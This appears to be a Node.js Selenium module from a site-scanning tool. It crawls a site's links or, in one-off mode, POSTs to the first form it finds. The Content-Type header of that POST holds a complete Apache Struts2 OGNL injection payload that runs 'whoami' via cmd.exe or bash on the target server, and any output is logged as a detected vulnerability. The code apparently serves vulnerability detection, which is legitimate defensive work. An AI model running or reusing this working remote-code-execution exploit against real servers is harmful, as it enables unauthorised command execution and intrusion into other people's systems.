
var exports = module.exports = {};
var webdriver = require('selenium-webdriver'),
  chrome = require('selenium-webdriver/chrome'),
  By = webdriver.By,
  until = webdriver.until,
  SiteReport = require('../model/SiteReport.js');
  const pool = require('../db');


exports.runTest = function(site,account,runtype,node){
  var returnMessage = {};
  var options = new chrome.Options();
  
  // https://github.com/SeleniumHQ/selenium/wiki/Logging
  var logging_prefs = new webdriver.logging.Preferences();
  logging_prefs.setLevel(webdriver.logging.Type.PERFORMANCE, webdriver.logging.Type.SERVER,webdriver.logging.Level.ALL);
  options.setLoggingPrefs(logging_prefs);
  options.addArguments("--no-sandbox");
  
  var capabilities = {
    'applicationName' : node
  };
  
  var hubAddr = 'localhost';
    
  var driver = new webdriver.Builder()
    .withCapabilities(capabilities)
    .forBrowser('chrome')
    .setChromeOptions(options)
    .usingServer('http://' + hubAddr + ':4444/wd/hub')
    .build();
  
  console.log('_____adding test for ' + site + ' to node: ' + node);
  
  driver.manage().window().setSize(1280, 1280);

  var testUrl = 'http://' + site,
      testdata = {}, testimage = {};
  
   // get a page with the cookie
   returnMessage = driver.get(testUrl).then(function() {
     
    if(runtype !== 'oneoff') {
      //crawl all first party domains from initial page load
      driver.executeScript(function(){
        var hostmatch = window.location.host,
          firstandthird = false,
          collection = document.getElementsByTagName('a'), currentValues = [],
          values = [].map.call(collection, function(obj) {
            if(currentValues.indexOf(obj.href) < 0){
              var tld = obj.hostname.split('.');
              if(tld.length > 1){
                tld = tld[tld.length -2] + '.' + tld[tld.length -1];
              }else{
                tld = obj.hostname;
              }
              if(firstandthird){
                currentValues.push(obj.href);
              }else{
                if(hostmatch && (hostmatch.indexOf(tld) > -1)){
                  currentValues.push(obj.href);
                }
              }
            }
          });
        return(currentValues);
        }).then(function (return_value) {
        testdata.allCrawlableDomains = return_value;
        testdata.url = site;
        testdata.account = account;
        testdata.timestamp = Date.now();
        testdata.geo = node;
        testdata.formList = 'did not check';
        SiteReport.testdata = testdata;
      })
    }else{
      //look for forms
        return driver.executeAsyncScript(function(){
  
          var form = document.querySelectorAll('form')[0],
            callback = arguments[arguments.length - 1],
            vulndetected = false;
             
          if(form){doXHR(form.action);}else{callback('')};
          
          function doXHR(url){
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
  
            xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            xhr.setRequestHeader("Accept-Language","en-US,en;q=0.5");
            xhr.setRequestHeader("Content-Type", "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Content-Length','1')).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
  
            xhr.onreadystatechange = function() {
              if(xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
                callback(xhr.responseText);
              }
            };
            xhr.send();
          }
          
          
        }).then(function (return_value) {
          
          testdata.vulnDetected = return_value.length > 0;
          console.log('_________________Vulnerability detected? ',testdata.vulnDetected,return_value);
          testdata.url = site;
          testdata.account = account;
          testdata.timestamp = Date.now();
          testdata.geo = node;
          SiteReport.testdata = testdata;
      })
  
      
    }
    
     
    driver.close();
    
  });
  
  return returnMessage;
  
};
